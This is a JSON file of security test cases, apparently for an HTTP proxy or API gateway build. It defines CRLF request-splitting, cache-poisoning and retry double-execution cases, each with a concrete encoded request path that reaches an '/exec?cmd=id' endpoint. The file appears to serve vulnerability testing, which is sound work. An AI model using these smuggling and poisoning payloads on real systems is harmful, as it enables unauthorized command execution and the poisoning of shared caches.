{
  "dialect": "flat",
  "build": "afdc173f",
  "prefix": "/api",
  "cells": [
    {
      "family": "request_line_split",
      "build": "afdc173f",
      "dialect": "flat",
      "source": "r12X",
      "poc": "ev_r12_X_run.sh",
      "shape": "GET with %0d%0a in the query; upstream receives a second, 4-token request",
      "expect": "exec",
      "steps": [
        {
          "name": "attack",
          "path": "/api/x?a%0d%0aGET%20/exec%3fcmd=id%0d%0aHost:%20u%0d%0a%20HTTP/1.1"
        }
      ]
    },
    {
      "family": "cache_exec_poison",
      "build": "afdc173f",
      "dialect": "flat",
      "source": "r12X",
      "poc": "ev_r12_X_run.sh",
      "shape": "seed %2f-split exec, then a victim with a different Accept-Encoding hits the entry",
      "expect": "cache_victim",
      "steps": [
        {
          "name": "seed",
          "path": "/api%2fexec%20?cmd=id",
          "keep_alive": true
        },
        {
          "name": "victim",
          "path": "/api%2fexec%20?cmd=id",
          "headers": [
            "Accept-Encoding: gzip"
          ]
        }
      ],
      "victim_same_key": false
    },
    {
      "family": "retry_double_exec",
      "build": "afdc173f",
      "dialect": "flat",
      "source": "r12X",
      "poc": "ev_r12_X_run.sh",
      "shape": "upstream executes then dies; the retry executes the same command again",
      "expect": "retry",
      "fail_first": 1,
      "steps": [
        {
          "name": "attack",
          "path": "/api%2fexec%20?cmd=id"
        }
      ]
    }
  ]
}
